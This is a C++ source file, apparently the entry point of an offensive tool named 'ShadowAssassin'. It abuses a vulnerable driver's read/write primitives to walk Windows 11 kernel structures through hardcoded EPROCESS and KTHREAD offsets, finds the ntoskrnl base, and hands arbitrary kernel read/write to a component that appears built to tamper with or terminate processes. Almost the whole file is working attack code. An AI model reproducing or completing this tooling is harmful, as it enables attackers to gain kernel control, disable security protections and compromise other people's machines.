#include "shadowassassin.h"
#include "ReadWriteLibrary/VulnerableDriverReadWrite.h"

// Win11 26100 verified offsets
static const UINT64 OFF_UNIQUE_PID         = 0x1d0; // EPROCESS->UniqueProcessId
static const UINT64 OFF_APL                = 0x1d8; // EPROCESS->ActiveProcessLinks
static const UINT64 OFF_THREAD_LIST_HEAD   = 0x370; // EPROCESS->ThreadListHead
static const UINT64 OFF_KTHREAD_LIST_ENTRY = 0x2f8; // KTHREAD->ThreadListEntry
static const UINT64 OFF_KTHREAD_START_ADDR = 0x450; // KTHREAD->StartAddress

static bool IsValidKernelAddress(UINT64 addr) {
    return addr >= 0xFFFF800000000000ULL && addr <= 0xFFFFFFFFFFFFFFF0ULL;
}

static UINT64 Read64(VulnerableDriver& drv, UINT64 addr) {
    if (!IsValidKernelAddress(addr)) {
        DbgLog("[Read64] SKIP: non-canonical addr=0x%llX\n", addr);
        return 0;
    }
    UINT64 val = 0;
    drv.Read(&val, addr, sizeof(UINT64));
    return val;
}

static UINT64 GetKernelBase(VulnerableDriver& drv, UINT64 eprocess) {
    // Walk ActiveProcessLinks to find System (PID 4)
    UINT64 current = eprocess;
    UINT64 systemEprocess = 0;
    for (int i = 0; i < 1024; i++) {
        UINT64 pid = Read64(drv, current + OFF_UNIQUE_PID);
        DbgLog("[GetKernelBase] Walk[%d] EPROCESS=0x%llX PID=%llu\n", i, current, pid);
        if (pid == 4) { systemEprocess = current; break; }
        UINT64 flink = Read64(drv, current + OFF_APL);
        current = flink - OFF_APL;
        if (!current || current == eprocess) break;
    }
    if (!systemEprocess) {
        DbgLog("[GetKernelBase] FAIL: System EPROCESS not found\n");
        return 0;
    }
    DbgLog("[GetKernelBase] System EPROCESS=0x%llX\n", systemEprocess);

    // First System KTHREAD -> StartAddress is inside ntoskrnl
    UINT64 threadFlink = Read64(drv, systemEprocess + OFF_THREAD_LIST_HEAD);
    if (!threadFlink) {
        DbgLog("[GetKernelBase] FAIL: ThreadListHead flink is 0\n");
        return 0;
    }
    UINT64 kthread    = threadFlink - OFF_KTHREAD_LIST_ENTRY;
    UINT64 startAddr  = Read64(drv, kthread + OFF_KTHREAD_START_ADDR);
    if (!startAddr) {
        DbgLog("[GetKernelBase] FAIL: KTHREAD StartAddress is 0\n");
        return 0;
    }
    DbgLog("[GetKernelBase] KTHREAD=0x%llX StartAddress=0x%llX\n", kthread, startAddr);

    // Scan back page by page for MZ
    UINT64 base = startAddr & ~0xFFFULL;
    for (int i = 0; i < 0x800; i++, base -= 0x1000) {
        if (!IsValidKernelAddress(base)) {
            DbgLog("[GetKernelBase] FAIL: scan went below valid kernel range at i=%d base=0x%llX\n", i, base);
            return 0;
        }
        UINT64 val = Read64(drv, base);
        if ((val & 0xFFFF) == 0x5A4D) {
            DbgLog("[GetKernelBase] Found MZ at 0x%llX (%d pages back)\n", base, i);
            return base;
        }
    }
    DbgLog("[GetKernelBase] FAIL: MZ not found in 0x800 pages\n");
    return 0;
}

int main() {
    DbgLog("=== ShadowAssassin init ===\n");

    VulnerableDriver driver;
    driver.EnablePrimitives();

    if (!driver.primitivesEnabled) {
        DbgLog("[main] FAIL: primitives not enabled — driver may not be loaded\n");
        return 1;
    }
    DbgLog("[main] Primitives enabled\n");

    UINT64 eprocess = driver.GetEPROCESS();

    if (!eprocess) {
        DbgLog("[main] FAIL: GetEPROCESS returned 0\n");
        driver.CleanUp();
        return 1;
    }

    ShadowAssassin assassin;

    assassin.SetReadPrimitive([&](UINT64* dst, UINT64 addr, UINT64 size) { driver.Read(dst, addr, size); });
    assassin.SetWritePrimitive([&](UINT64 addr, UINT64 data) { driver.Write(addr, data); });

    assassin.SetEPROCESS(eprocess);
    assassin.SetTrapFrameOffset(0x90); // KTHREAD.TrapFrame — verify against current dump.cs

    bool ok = assassin.Initialize();
    DbgLog("[main] Initialize() = %s\n", ok ? "OK" : "FAIL");

    driver.CleanUp();
    DbgLog("[main] Done\n");
    return ok ? 0 : 1;
}
